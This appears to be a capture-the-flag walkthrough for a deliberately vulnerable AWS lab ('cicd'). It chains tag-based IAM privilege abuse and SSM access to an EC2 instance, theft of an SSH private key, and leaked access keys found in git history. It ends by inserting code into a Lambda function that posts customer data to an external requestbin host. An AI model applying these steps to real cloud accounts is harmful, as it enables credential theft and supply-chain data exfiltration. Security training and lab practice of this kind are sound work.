# CICD
FooCorp is a company exposing a public-facing API. Customers of FooCorp submit sensitive data to the API every minute to the following API endpoint:
```
POST {apiUrl}/prod/hello
Host: {apiHost}
Content-Type: text/html
```
superSecretData=...
The API is implemented as a Lambda function, exposed through an API Gateway.

Because FooCorp implements DevOps, it has a continuous deployment pipeline automatically deploying new versions of their Lambda function from source code to production in under a few minutes.

Goal: Retrieve the sensitive data submitted by customers.

Note that simulated user activity is taking place in the account. This is implemented through a CodeBuild project running every minute and simulating customers requests to the API. This CodeBuild project is out of scop

# Walkthrough

## Login 
```
aws configure --profile api

aws sts get-caller-identity --profile api

Identify permissions
aws iam list-user-policies --user-name ec2-sandbox-manager --profile api
Found initial-policy

Get the policy
aws iam get-user-policy --user-name ec2-sandbox-manager --policy-name initial-policy --profile api
 {
  # Creates and deletes tags if it is matching dev.
      "Action": [
          "ec2:CreateTags",
          "ec2:DeleteTags"
      ],
      "Condition": {
          "StringLike": {
              "ec2:ResourceTag/Environment": [
                  "dev"
              ]
          }
      },
      "Effect": "Allow",
      "Resource": "*"
  },
  # Starts an SSM session if we have the sandbox tag set
  {
      "Action": [
          "ssm:*"
      ],
      "Condition": {
          "StringLike": {
              "ssm:ResourceTag/Environment": [
                  "sandbox"
              ]
          }
      },
      "Effect": "Allow",
      "Resource": "*"
  },

```

## List ec2 instances and alter tags
```
aws ec2 describe-instances --profile api  > output.json
Found instance: i-0bfec60277649d4d0. Note that the instance name is dev-instance. 
The instance has a tag for dev environment.

Modify Tags
aws ec2 create-tags --tags Key=Environment,Value=sandbox --profile api --resources i-0bfec60277649d4d0

Connect to instance
aws ssm start-session --target i-0bfec60277649d4d0 --profile api

Start a bash session
bash -l
```

## Steal SSH Keys
```
Key Location
cd /home/ssm-user
ls .ssh/
Found id_rsa

cat .ssh/id_rsa

In your local machine
nano private_key.pem
Save the output of .ssh/id_rsa here

chmod 600 private_key.pem
```

## Identify the ssh key id of the key for cloning
```
ssh-keygen -f private_key.pem -l -E md5 
Received fingerprint of 2048 MD5:f4:9c:6c:30:04:a9:2a:5a:fc:4b:a1:e5:60:ab:a1:d2 no comment (RSA)

List users
aws iam list-users --profile api
Found user cloner 

Get ssh key 
aws iam list-ssh-public-keys --user-name cloner

Get finger print of key
aws iam get-ssh-public-key --user-name cloner --ssh-public-key-id APKAZY5445TNWPGIBCVJ --encoding PEM --output text --query 'SSHPublicKey.Fingerprint
f4:9c:6c:30:04:a9:2a:5a:fc:4b:a1:e5:60:ab:a1:d2 -> Same as the fingerprint above. Therefore key id is APKAZY5445TNWPGIBCVJ
```

## Clone git commit repository
```
aws codecommit list-repositories --profile api
Found backend-api repository

Configure ssh key in host file. Add the following lines in ~/.ssh/config
# For code commit
Host git-codecommit.*.amazonaws.com
  User APKAZY5445TNWPGIBCVJ
  IdentityFile <path to private_key.pem>/private_key.pem
  PubkeyAcceptedAlgorithms +ssh-rsa
  HostkeyAlgorithms +ssh-rsa

Clone
git clone ssh://APKAZY5445TNWPGIBCVJ@git-codecommit-.us-east-1.amazonaws.com/v1/repos/backend-api

Show commits
cd backend-api
git log
Foudn commit id for buildspec.yml f826d31aeeca17f9cbe7d76bcb0de0cd3909a785

Show what was changed in commit
git show f826d31aeeca17f9cbe7d76bcb0de0cd3909a785
Found Access key and secret access key
```

## Change Lambda code
```
We need to post the data to our custom webpage. Create one here: https://pipedream.com/requestbin
Copy the link and insert the following into the app.py
def handle(event):
  body = event.get('body')
  import requests; requests.post("https://XXXXX.m.pipedream.net", data=body) <- ADDED
  if body is None:
    return 400, "missing body"

Export Access keys as per above
export AWS_ACCESS_KEY=..
export AWS_SECRET_ACCESS_KEY=...

Get parent commit 
aws codecommit get-branch --repository-name backend-api --branch-name master --region us-east-1
Found commit id a61d8de821a6cb036a23da13595806e5bd64c5ac

Commit 
aws codecommit put-file --repository-name backend-api --branch-name master --file-content fileb://./app.py --file-path app.py --parent-commit-id a61d8de821a6cb036a23da13595806e5bd64c5ac --region us-east-1

```

## Get flag!
Wait at least 5 minutes for the code to deploy to lambda. Monitor you pipedream to identify the post request

You should see the following in your body: superSecretData=FLAG{SupplyCh4!nS3curityM4tt3r5"}


# References

# Trouble Shooting
### Problem with ECR - Error: local-exec provisioner error or docker only accepts 1 argument
```
Replace the line in cloudgoat/scenarios/cicd/terraform/vulnerable-buildspec.yml.tftpl and cloudgoat/assets/src/buildspec.yml
- aws ecr get-login-password ...
with 
- aws ecr get-login-password --region us-east-1 | docker login --username AWS --password-stdin <ACCOUNT ID>.dkr.ecr.us-east-1.amazonaws.com
```

### Problem with ssm: An error occurred (TargetNotConnected) when calling the StartSession operation: i-0bfec60277649d4d0 is not connected.
Need to create new security group for ec2, only allow HTTPS outbound 
Create vpc endpoints for ssm, ec2messages, ssmmessages. Allow HTTPS inbound from vpc CIDR and outbound HTTPS

### Problem with executing API
Change the docker file to the one specified in this directory. In particular the docker file should use python3.10
